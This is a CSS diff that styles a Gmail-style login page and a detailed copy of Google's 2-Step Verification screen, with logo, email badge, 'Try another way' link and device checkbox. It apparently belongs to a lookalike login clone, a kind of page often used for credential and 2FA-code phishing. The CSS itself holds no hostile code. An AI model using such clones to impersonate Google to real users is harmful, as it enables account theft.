@@ -8,6 +8,9 @@
     --btn-blue: #8ab4f8;
     --shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
 }
+body {
+    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+}
 
 .gmail-login-page {
     min-height: 100vh;
@@ -328,6 +331,214 @@
 .footer-links a:hover {
     text-decoration: underline;
 }
+
+.error-text {
+    color: #d93025; /* Gmail red */
+    font-size: 12px;
+    margin-top: 4px;
+}
+
+.input-error {
+    border-color: #d93025;
+}
+
+/* ── PAGE ─────────────────────────────────────────────── */
+.twostep-page {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: #292a2d;
+    padding: 16px;
+    box-sizing: border-box;
+    font-family: 'Google Sans', Roboto, Arial, sans-serif;
+}
+
+/* ── CARD ─────────────────────────────────────────────── */
+.twostep-card {
+    display: flex;
+    flex-direction: row;
+    background: #0f0f0f;
+    border-radius: 16px;
+    width: 100%;
+    max-width: 860px;       /* ← max card width on large screens */
+    min-height: 360px;
+    overflow: hidden;
+}
+
+/* ── DIVIDER between left and right ──────────────────── */
+.twostep-divider {
+    width: 1px;
+    background: #3c3c3c;
+    flex-shrink: 0;
+    margin: 40px 0;         /* ← top/bottom inset of the divider line */
+}
+
+/* ── LEFT SIDE ────────────────────────────────────────── */
+.twostep-left {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    padding: 48px 40px;     /* ← inner padding of left side */
+}
+
+.google-logo {
+    width: 40px;
+    height: 40px;
+    margin-bottom: 20px;    /* ← gap: G logo → title */
+}
+
+.twostep-title {
+    font-size: 26px;
+    font-weight: 400;
+    color: #e8eaed;
+    margin: 0 0 10px 0;     /* ← gap: title → description */
+}
+
+.twostep-desc {
+    font-size: 14px;
+    color: #e8eaed;
+    line-height: 1.6;
+    margin: 0 0 20px 0;     /* ← gap: description → email badge */
+}
+
+.twostep-email-badge {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    border: 1px solid #5f6368;
+    border-radius: 20px;
+    padding: 6px 14px;
+    width: fit-content;
+    font-size: 14px;
+    color: #e8eaed;
+    margin-bottom: auto;    /* ← pushes "Resend it" to bottom of left side */
+}
+
+.twostep-email-text {
+    max-width: 200px;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+}
+
+.twostep-avatar {
+    font-size: 15px;
+    flex-shrink: 0;
+}
+
+.twostep-arrow {
+    font-size: 11px;
+    color: #9aa0a6;
+    flex-shrink: 0;
+}
+
+.twostep-resend {
+    color: #8ab4f8;
+    font-size: 14px;
+    text-decoration: none;
+    margin-top: 24px;       /* ← gap: email badge → "Resend it" */
+}
+
+.twostep-resend:hover {
+    text-decoration: underline;
+}
+
+/* ── RIGHT SIDE ───────────────────────────────────────── */
+.twostep-right {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    padding: 48px 40px;     /* ← inner padding of right side */
+    /*
+      padding-top matches where "2-Step Verification" sits on the left.
+      Left has: 40px logo + 20px gap = 60px before title.
+      So right padding-top = 48px (card padding) brings it close.
+      Adjust padding-top below if alignment is slightly off:
+    */
+    padding-top: 108px;     /* ← nudge up/down to align with "2-Step Verification" */
+}
+
+.twostep-device-title {
+    font-size: 16px;
+    font-weight: 500;
+    color: #e8eaed;
+    margin: 0 0 10px 0;     /* ← gap: device title → description */
+}
+
+.twostep-device-desc {
+    font-size: 14px;
+    color: #9aa0a6;
+    line-height: 1.6;
+    margin: 0 0 20px 0;     /* ← gap: description → checkbox */
+}
+
+/* ── CHECKBOX ─────────────────────────────────────────── */
+.twostep-checkbox-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;              /* ← gap between checkbox box and label */
+    font-size: 14px;
+    color: #e8eaed;
+    white-space: nowrap;    /* keeps checkbox + label on one line always */
+}
+
+.twostep-checkbox-row input[type="checkbox"] {
+    width: 16px;
+    height: 16px;
+    accent-color: #8ab4f8;
+    flex-shrink: 0;
+    cursor: pointer;
+    margin: 0;
+}
+
+.twostep-checkbox-row label {
+    cursor: pointer;
+    user-select: none;
+}
+
+/* ── TRY ANOTHER WAY ──────────────────────────────────── */
+.twostep-try-another-wrap {
+    display: flex;
+    justify-content: flex-end;
+    margin-top: auto;       /* ← pushes to very bottom of right column */
+    padding-top: 16px;
+}
+
+.twostep-try-another {
+    color: #8ab4f8;
+    font-size: 14px;
+    text-decoration: none;
+}
+
+.twostep-try-another:hover {
+    text-decoration: underline;
+}
+
+/* ── RESPONSIVE: stack on small screens ───────────────── */
+@media (max-width: 620px) {
+    .twostep-card {
+        flex-direction: column;
+    }
+
+    .twostep-divider {
+        width: 100%;
+        height: 1px;
+        margin: 0 40px;
+        width: calc(100% - 80px);
+    }
+
+    .twostep-right {
+        padding-top: 32px;  /* ← reset padding when stacked */
+    }
+
+    .twostep-try-another-wrap {
+        justify-content: flex-start;
+        margin-top: 24px;
+    }
+}
+
 
 /* Responsive */
 @media (max-width: 960px) {
